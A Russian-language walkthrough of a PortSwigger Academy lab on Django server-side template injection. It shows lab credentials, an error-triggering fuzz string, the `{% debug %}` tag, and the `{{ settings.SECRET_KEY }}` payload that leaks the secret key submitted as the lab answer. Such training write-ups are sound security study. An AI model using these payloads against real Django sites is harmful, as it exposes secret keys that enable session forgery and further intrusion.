Перейдем на уязвимый ресурс и залогинимся как `content-manager:C0nt3ntM4n4g3r`

Далее перейдем на случайную карточку товара и нажмем `edit template`


и ввдем следующую строку `${{<%[%'"}}%\` для проверки, выдаст ли какую-то ошибку
и нажмем `preview`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/5.%20Server-side%20template%20injection%20with%20information%20disclosure%20via%20user-supplied%20objects/pics%20for%20walkthrough/1.png)

отлично, нам выдало ошибку
```
Traceback (most recent call last): File "<string>", line 11, in <module> File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 191, in __init__ self.nodelist = self.compile_nodelist() File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 230, in compile_nodelist return parser.parse() File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 486, in parse raise self.error(token, e) django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '<%[%'"' from '<%[%'"'
```

после которой мы понимаем, что под капотом крутится сервис на `Django`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/5.%20Server-side%20template%20injection%20with%20information%20disclosure%20via%20user-supplied%20objects/pics%20for%20walkthrough/2.png)

Далее после поискового запроса `Django ssti` мы набрели на мануал
```
https://gitbook.seguranca-informatica.pt/fuzzing-and-web/server-side-template-injection-ssti
```
где показывается, что у Django есть параметр `{% debug %}`

Отлично, кего и укажем в нашем темплейте
 и видим, что нам выдало огромную портянку 

но в ней ничего полезного, увы, мы не нашли

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/5.%20Server-side%20template%20injection%20with%20information%20disclosure%20via%20user-supplied%20objects/pics%20for%20walkthrough/3.png)

далее ресерчим  и находим, как нам достучаться до секретного ключа `https://docs.djangoproject.com/en/5.0/ref/settings/`

достаточно ввести `{{ settings.SECRET_KEY }}`

и мы получим секретный ключ, который и сдадим как ответ на лабораторную работу
`z99irwdh6du1kti53xn8qhz5t8w3t5hp`


![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/5.%20Server-side%20template%20injection%20with%20information%20disclosure%20via%20user-supplied%20objects/pics%20for%20walkthrough/4.png)
